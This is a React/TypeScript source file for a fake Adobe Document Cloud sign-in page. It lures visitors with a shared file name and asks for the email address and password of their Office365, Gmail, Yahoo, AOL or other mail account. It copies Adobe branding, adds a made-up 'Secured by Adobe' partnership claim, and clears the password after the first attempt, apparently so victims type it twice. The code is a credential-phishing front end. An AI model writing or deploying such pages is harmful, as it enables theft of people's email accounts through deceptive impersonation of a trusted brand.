import React, { useState } from 'react';
import { ArrowLeft, Eye, EyeOff } from 'lucide-react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onYahooSelect?: () => void;
  onAolSelect?: () => void;
  onGmailSelect?: () => void;
  onOffice365Select?: () => void;
}

const LoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onBack,
  onLoginSuccess, 
  onLoginError,
  onYahooSelect,
  onAolSelect,
  onGmailSelect,
  onOffice365Select,
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  
  const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
    onLoginSuccess,
    onLoginError
  );

  const emailProviders = [
    { name: 'Office365', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];

  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
    // After the first attempt, the hook returns { isFirstAttempt: true }
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    resetLoginState();
  };

  const handleProviderClick = (providerName: string) => {
    if (providerName === 'Office365' && onOffice365Select) {
      onOffice365Select();
    } else if (providerName === 'Outlook' && onOffice365Select) {
      onOffice365Select();
    } else if (providerName === 'Yahoo' && onYahooSelect) {
      onYahooSelect();
    } else if (providerName === 'AOL' && onAolSelect) {
      onAolSelect();
    } else if (providerName === 'Gmail' && onGmailSelect) {
      onGmailSelect();
    } else {
      setSelectedProvider(providerName);
    }
  };

  const AdobeLogo = () => (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-7 h-7">
      <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
      <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
      <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
    </svg>
  );

  return (
    <div className="min-h-screen flex items-center justify-center p-4 font-sans" style={{ background: 'linear-gradient(135deg, #323236 0%, #44444A 50%, #323236 100%)', fontFamily: "'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
      {/* Adobe red accent bar at the very top */}
      <div className="fixed top-0 left-0 right-0 h-1" style={{ background: 'linear-gradient(90deg, #FA0F00, #E8336D, #1473E6)' }} />

      {!selectedProvider ? (
        <div className="w-full max-w-sm">
          <div className="mb-10 text-center">
            <div className="flex justify-center mb-5">
              <AdobeLogo />
            </div>
            <h1 className="text-xl font-semibold text-white mb-2">Sign in to access your document</h1>
            <p className="text-sm text-gray-400">
              <span className="font-medium text-gray-300">{fileName}</span>
            </p>
          </div>
          
          <p className="text-sm font-medium text-gray-300 mb-4">Choose your email provider</p>
          <div className="space-y-2">
            {emailProviders.map((provider) => (
              <button
                key={provider.name}
                onClick={() => handleProviderClick(provider.name)}
                type="button"
                className="w-full group"
              >
                <div className="flex items-center px-4 py-3 rounded-md border transition-all duration-150" style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderColor: 'rgba(255,255,255,0.12)' }} onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = 'rgba(255,255,255,0.1)'; e.currentTarget.style.borderColor = '#1473E6'; }} onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = 'rgba(255,255,255,0.05)'; e.currentTarget.style.borderColor = 'rgba(255,255,255,0.12)'; }}>
                  <img src={provider.logo} alt={provider.name} className="w-6 h-6 object-contain flex-shrink-0" />
                  <span className="flex-1 text-sm font-medium text-gray-200 group-hover:text-white transition-colors ml-3 text-left">
                    {provider.name}
                  </span>
                  <svg className="w-4 h-4 text-gray-500 group-hover:text-[#1473E6] transition-colors flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                  </svg>
                </div>
              </button>
            ))}
          </div>

          <div className="mt-10 pt-6" style={{ borderTop: '1px solid rgba(255,255,255,0.08)' }}>
            <div className="flex items-center justify-center gap-2 mb-3">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-4 h-4">
                <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
                <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
                <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
              </svg>
              <span className="text-xs font-medium text-gray-400">Adobe Document Cloud</span>
            </div>
            <p className="text-xs text-gray-500 text-center mb-2">Secured by Adobe® in partnership with Xtransferbloom</p>
            <div className="flex items-center justify-center gap-3 text-xs text-gray-600">
              <a href="https://www.adobe.com/privacy.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-400 transition-colors">Privacy</a>
              <span style={{ color: 'rgba(255,255,255,0.15)' }}>|</span>
              <a href="https://www.adobe.com/legal/terms.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-400 transition-colors">Terms of Use</a>
              <span style={{ color: 'rgba(255,255,255,0.15)' }}>|</span>
              <a href="https://www.adobe.com/privacy/cookies.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-400 transition-colors">Cookie Preferences</a>
            </div>
            <p className="text-xs text-gray-600 text-center mt-2">© 2026 Adobe. All rights reserved.</p>
          </div>
        </div>
      ) : (
        <div className="w-full max-w-sm">
          <div className="mb-8 text-center">
            <div className="flex justify-center mb-5">
              <AdobeLogo />
            </div>
            <h1 className="text-xl font-semibold text-white">Sign in with {selectedProvider}</h1>
            <p className="text-sm text-gray-400 mt-1">
              to access <span className="font-medium text-gray-300">{fileName}</span>
            </p>
          </div>

          <button onClick={handleBackToProviders} className="flex items-center gap-1.5 text-sm text-[#1473E6] hover:text-[#4B9CF5] font-medium mb-6 transition-colors">
            <ArrowLeft className="w-4 h-4" />
            Back to providers
          </button>

          <form onSubmit={handleSubmit} className="space-y-5">
            {errorMessage && (
              <div className="p-3 rounded-md text-sm font-medium flex items-start gap-2" style={{ backgroundColor: 'rgba(215, 55, 63, 0.15)', color: '#FF6B6B', border: '1px solid rgba(215, 55, 63, 0.3)' }}>
                <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
                <span>{errorMessage}</span>
              </div>
            )}

            <div>
              <label className="text-sm font-medium text-gray-300 block mb-1.5" htmlFor="email">Email address</label>
              <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className="w-full px-3 py-2.5 rounded-md text-sm text-white outline-none transition placeholder:text-gray-500" style={{ backgroundColor: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.15)' }} onFocus={(e) => { e.currentTarget.style.borderColor = '#1473E6'; e.currentTarget.style.boxShadow = '0 0 0 2px rgba(20,115,230,0.3)'; }} onBlur={(e) => { e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)'; e.currentTarget.style.boxShadow = 'none'; }} />
            </div>

            <div>
              <label className="text-sm font-medium text-gray-300 block mb-1.5" htmlFor="password">Password</label>
              <div className="relative">
                <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full px-3 pr-10 py-2.5 rounded-md text-sm text-white outline-none transition placeholder:text-gray-500" style={{ backgroundColor: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.15)' }} onFocus={(e) => { e.currentTarget.style.borderColor = '#1473E6'; e.currentTarget.style.boxShadow = '0 0 0 2px rgba(20,115,230,0.3)'; }} onBlur={(e) => { e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)'; e.currentTarget.style.boxShadow = 'none'; }} />
                <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-200 transition-colors">
                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-2.5 px-4 rounded-full font-semibold text-sm text-white bg-[#1473E6] hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
              {isLoading ? 'Verifying...' : 'Sign In'}
            </button>
          </form>

          <div className="mt-10 pt-6" style={{ borderTop: '1px solid rgba(255,255,255,0.08)' }}>
            <div className="flex items-center justify-center gap-2 mb-3">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-4 h-4">
                <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
                <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
                <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
              </svg>
              <span className="text-xs font-medium text-gray-400">Adobe Document Cloud</span>
            </div>
            <p className="text-xs text-gray-500 text-center mb-2">Secured by Adobe® in partnership with Xtransferbloom</p>
            <div className="flex items-center justify-center gap-3 text-xs text-gray-600">
              <a href="https://www.adobe.com/privacy.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-400 transition-colors">Privacy</a>
              <span style={{ color: 'rgba(255,255,255,0.15)' }}>|</span>
              <a href="https://www.adobe.com/legal/terms.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-400 transition-colors">Terms of Use</a>
              <span style={{ color: 'rgba(255,255,255,0.15)' }}>|</span>
              <a href="https://www.adobe.com/privacy/cookies.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-400 transition-colors">Cookie Preferences</a>
            </div>
            <p className="text-xs text-gray-600 text-center mt-2">© 2026 Adobe. All rights reserved.</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default LoginPage;
